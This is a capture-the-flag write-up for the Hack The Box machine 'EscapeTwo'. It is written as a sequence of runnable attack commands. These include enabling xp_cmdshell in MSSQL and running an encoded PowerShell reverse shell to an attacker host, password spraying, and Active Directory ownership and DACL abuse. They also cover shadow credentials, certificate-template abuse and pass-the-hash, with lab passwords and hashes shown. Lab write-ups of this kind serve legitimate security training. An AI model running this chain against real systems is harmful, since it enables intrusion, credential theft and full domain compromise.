# EscapeTwo

<figure><img src="../../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>

### Enumeration Phase

Start with nmap scan

```
nmap 10.10.11.51
```

<figure><img src="../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

Here we have everything standards in windows machine.



### SMB User Crack

Now lets checking out the creds that given to us: `rose / KxEPkKe6R8su`

<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

### Checking for File in SMB

```
smbclient -L //10.10.11.51 -U 'rose'
```

<figure><img src="../../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

```
smbclient //10.10.11.51/Accounting\ Department -U rose
```

<figure><img src="../../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>

Looking through to the files, download it using the get command and unpack the files.

Inside this file have user creds and we can use later for futher enumeration.

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

### Enabling xp\_cmdshell <a href="#finding-vulnerability--enabling-xp_cmdshell" id="finding-vulnerability--enabling-xp_cmdshell"></a>

Using `sa` creds. im able to login tp the MSSQL via admin.

<figure><img src="../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

To exploit MSSQL and enable xp\_cmdshell im using this command:

```
-- xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
 
-- check
EXEC sp_configure 'xp_cmdshell';
```

\
Now we can send reverse shell payload generated from [RevShell Generator](https://www.revshells.com/). I used Base64 PowerShell #3 and prepared to setup a listener.

<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

```
SQL (sa  dbo@master)> EXEC xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANQA1ACIALAAxADIAMwA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=='
```

The reverse shell obtain after the exec of the command in xp\_cmdshell\


<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

In `C:\` have a folder `SQL2019`.

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Found `sql-Configuration.INI` which is an SQL configuration file in the folder.

<figure><img src="../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

There’s another credential of user `sql_svc` / `WqSZAF6CysDQbGb3`. With this password I’m going to try  password spraying with a list of users that we got in the beginning.

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

It matched a user `ryan`.&#x20;

### User Flag

We can now try to log in as ryan using **Evil-WinRM**.&#x20;

```
evil-winrm -i 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3
```

Search for the flag:&#x20;

<figure><img src="../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>

### Priviledge Escalation (AD)

Running bloodhound on the target using `ryan` credentials.

```
bloodhound-python -u 'ryan' -p 'WqSZAF6CysDQbGb3' -d sequel.htb -dc DC01.sequel.htb -ns 10.10.11.51 -c All
```

<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

Launch the BloodHound GUI and upload the extracted data. From there, we'll examine all the nodes in the interface.

It appears that `Ryan` has the **WriteOwner** permission on the Certificate Authority user account (**ca\_svc**). This allows `Ryan` to modify or take ownership of the **ca\_svc** account, which could potentially be exploited to escalate privileges.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Grant Ownership

First, ownership of the **ca\_svc** account will be assigned to **Ryan**. This makes **Ryan** the owner of the **ca\_svc** object, granting him full control over it.

```
impacket-owneredit -action write -new-owner ryan -target ca_svc sequel.htb/ryan:WqSZAF6CysDQbGb3
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Grant Rights

The DACL (Discretionary Access Control List) defines who has what level of access to an object in Active Directory. By granting FullControl to `ryan`, this access can be used to perform privilege escalation.

```
impacket-dacledit -action write -rights FullControl -principal ryan -target ca_svc sequel.htb/ryan:WqSZAF6CysDQbGb3
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Shadow Credential Attacks

This attack involves adding a malicious Key Credential to the ca\_svc account, enabling ryan to authenticate as ca\_svc using a certificate rather than a password.

```
certipy-ad shadow auto -u 'ryan@sequel.htb' -p 'WqSZAF6CysDQbGb3' -account ca_svc -dc-ip 10.10.11.51
```

If you got this error: `Clock skew too great`

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Fix with this command:

```
sudo ntpdate sequel.htb
```

### Vulnerable Cert Template

<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

Now using the template we have to request a certificate as Administrator.

### Update Certificate Template Permission

Used `certipy-ad` to add enrollment rights for the service account `ca_svc` to the certificate template `DunderMifflinAuthentication`:

```
KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template -k -template DunderMifflinAuthentication -dc-ip 10.10.11.51 -target dc01.sequel.htb
```

This allowed `ca_svc` to request certificates for privileged users like Administrator.

### Request Certificate for Administrator

Using the `ca_svc` account and NTLM hash, requested a certificate for the Administrator account:

```
certipy-ad req -dc-ip 10.10.11.51 -u 'ca_svc@sequel.htb' -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -template 'DunderMifflinAuthentication' -upn Administrator@sequel.htb
```

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Successfully received the Administrator certificate saved as `administrator.pfx`.

### Authenticated and Extract Administrator NT Hash

Authenticated using the certificate:

```
certipy-ad auth -pfx administrator.pfx
```

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

### Access Administrator Shell with Evil-WinRm

Retrieve the flag at Desktop.

```
evil-winrm -i 10.10.11.51 -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
```

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
